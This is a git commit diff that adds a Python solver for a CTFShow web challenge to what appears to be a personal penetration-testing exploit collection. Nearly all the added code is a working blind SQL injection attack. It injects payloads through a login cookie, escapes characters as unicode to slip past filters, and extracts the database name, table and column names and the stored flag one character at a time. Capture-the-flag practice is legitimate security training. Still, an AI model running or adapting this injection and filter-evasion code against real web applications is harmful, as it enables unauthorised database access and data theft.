14cbf5372e7e9e15122d233b1a508e2ef7d47583
danny_home <dannycaihaoming@163.com>
2023-10-06 16:02:56 +0800

    提交更新

--- 渗透测试/靶场实践/常用exp/CTFShow解题.py
+++ 渗透测试/靶场实践/常用exp/CTFShow解题.py
@@ -74,5 +74,137 @@ def ctf_show_hongbao_6():
     for i in range(50):
         data2 = 'xixixix'
         threading.Thread(target=POST,args=(data2,)).start()
-ctf_show_hongbao_6()
+#ctf_show_hongbao_6()
 
+
+############ CTFshow web15 Fishman
+# 这道题改成了用group_concat, substr 一次性输出所有内容。
+# 原来的between and 实际是找出字符两端，然后左端开始缩小，当缩到实际字符的时候，条件判断就是出错，这时候c-1就能找到实际字符。
+def ctfshow_web15_Fishman():
+    url = "http://9c61123a-7596-4f9a-b8ed-2897a567a8f4.challenge.ctf.show/admin/"
+
+    def tamper(payload):
+        payload = payload.lower()
+        payload = payload.replace('u', '\\u0075')
+        payload = payload.replace('\'', '\\u0027')
+        payload = payload.replace('o', '\\u006f')
+        payload = payload.replace('i', '\\u0069')
+        payload = payload.replace('"', '\\u0022')
+        payload = payload.replace(' ', '\\u0020')
+        payload = payload.replace('s', '\\u0073')
+        payload = payload.replace('#', '\\u0023')
+        payload = payload.replace('>', '\\u003e')
+        payload = payload.replace('<', '\\u003c')
+        payload = payload.replace('-', '\\u002d')
+        payload = payload.replace('=', '\\u003d')
+        payload = payload.replace('f1a9', 'F1a9')
+        payload = payload.replace('f1', 'F1')
+        return payload
+
+    #get database length
+    def databaseName_len():
+        print ("start get database name length...")
+        for l in range(0,45):
+            payload = "1' or (length(database())=" + str(l+1) + ")#"
+            payload = tamper(payload)
+            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+            headers = {'cookie': tmpCookie}
+            r =requests.get(url, headers=headers)
+            myHeaders = str(r.raw.headers)
+            if ((myHeaders.count("login_data") == 1)):
+                print('get db length = ' + str(l).lower())
+                break
+
+    #get content
+    def get_databaseName():
+        flag = ''
+        for j in range(0, 15):
+            for c in range(0x20,0x7f):
+                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                    continue
+                else:
+                    payload = "1' or (select (database()) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+                print(payload)
+                payload = tamper(payload)
+                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+                headers = {'cookie': tmpCookie}
+                r =requests.get(url, headers=headers)
+                myHeaders = str(r.raw.headers)
+                if ((myHeaders.count("login_data") == 2)):
+                    flag += chr(c - 1)
+                    print('databasename = ' + flag.lower())
+                    break
+
+    #get content
+    def get_tableName():
+        flag = ''
+        for j in range(30, 50):           #blind inject
+            for c in range(0x20,0x7f):
+                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                    continue
+                else:
+                    # fish_admin,fish_ip,fish_user,fl2333g
+                    payload = "1' or (substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(j) + ",1) = '" + chr(c) + "')#"
+                    #payload = "1' or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+                # print(payload)
+                payload = tamper(payload)
+                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+                headers = {'cookie': tmpCookie}
+                r =requests.get(url, headers=headers)
+                myHeaders = str(r.raw.headers)
+                #print(myHeaders.count("login_data"))
+                if ((myHeaders.count("login_data") == 1)):
+                    flag += chr(c)
+                    print('tablename = ' + flag.lower())
+                    break
+
+    #get content
+    def get_ColumnName():
+        flag = ''
+        for j in range(0, 50):           #blind inject
+            for c in range(0x20,0x7f):
+                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                    continue
+                else:
+                    # flllllag
+                    payload = "1' or (substr((select group_concat(column_name) from information_schema.columns where table_name='fl2333g')," + str(j) + ",1) = '" + chr(c) + "')#"
+                    #payload = "1' or (select (select column_name from information_schema.columns where table_name='FL2333G' limit 0,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+                #print(payload)
+                payload = tamper(payload)
+                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+                headers = {'cookie': tmpCookie}
+                r =requests.get(url, headers=headers)
+                myHeaders = str(r.raw.headers)
+                if ((myHeaders.count("login_data") == 1)):
+                    flag += chr(c)
+                    print('column name = ' + flag.lower())
+                    break
+
+    #get content
+    def get_value():
+        flag = ''
+        for j in range(0, 50):           #blind inject
+            for c in range(0x20,0x7f):
+                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
+                    continue
+                else:
+                    payload = "1' or (substr((select flllllag from FL2333G)," + str(j) + ",1) = '" + chr(c) + "')#"
+                    # payload = "1' or (select (select FLLLLLAG from FL2333G) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
+                #print(payload)
+                payload = tamper(payload)
+                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
+                headers = {'cookie': tmpCookie}
+                r =requests.get(url, headers=headers)
+                myHeaders = str(r.raw.headers)
+                if ((myHeaders.count("login_data") == 1)):
+                    flag += chr(c)
+                    print('flag = ' + flag.lower())
+                    break
+
+    print ("start database sql injection...")
+    databaseName_len()
+    get_databaseName()
+    get_tableName()
+    get_ColumnName()
+    get_value()
+#ctfshow_web15_Fishman()
